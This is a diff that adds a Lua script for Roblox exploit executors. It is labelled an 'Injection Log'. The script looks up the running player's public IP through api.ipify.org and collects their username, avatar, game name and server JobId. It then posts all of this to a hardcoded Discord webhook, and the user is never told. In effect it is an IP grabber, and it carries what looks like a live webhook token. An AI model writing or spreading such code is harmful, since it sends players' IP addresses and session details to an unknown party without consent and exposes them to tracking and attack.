@@ -1,0 +1,100 @@
+local webhookURL = "https://discord.com/api/webhooks/1466998792220967033/1K67Y39hl4TKzSPkMUVgb1FTWqK6ROPU1eIAQSyVdVF7yZb8YeOZjtxVezDYghqHFOs2"
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local userId = player.UserId
+local gameid = game.GameId
+local avatarApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png"
+
+local avatarImageUrl = nil
+local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
+
+if requestFunc then
+    local thumbnailResponse = requestFunc({
+        Url = avatarApiUrl,
+        Method = "GET"
+    })
+
+    local data = HttpService:JSONDecode(thumbnailResponse.Body)
+    if data and data.data and data.data[1] and data.data[1].imageUrl then
+        avatarImageUrl = data.data[1].imageUrl
+    end
+end
+
+
+local ipAddress = "Unknown"
+if requestFunc then
+    local ipResponse = requestFunc({
+        Url = "http://api.ipify.org",
+        Method = "GET"
+    })
+    if ipResponse and ipResponse.Body then
+        ipAddress = ipResponse.Body
+    end
+end
+
+local success, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+
+local gameName = success and gameInfo.Name or "Unknown"
+local message = {
+    ["username"] = "Injection Log",
+    ["embeds"] = {{
+
+        ["title"] = " Clanning Injected",
+        ["color"] = 16711680,
+        ["thumbnail"] = {
+            ["url"] = avatarImageUrl or ""
+        },
+        ["fields"] = {
+            {
+                ["name"] = "RobloxUSER",
+                ["value"] = player.Name,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Name yesss",
+                ["value"] = gameName,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game ID",
+                ["value"] = tostring(game.PlaceId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Job shit",
+                ["value"] = game.JobId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game ID yes",
+                ["value"] = game.GameId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Public IP",
+                ["value"] = ipAddress,
+                ["inline"] = true
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }}
+}
+
+if requestFunc then
+    local jsonData = HttpService:JSONEncode(message)
+    requestFunc({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+end
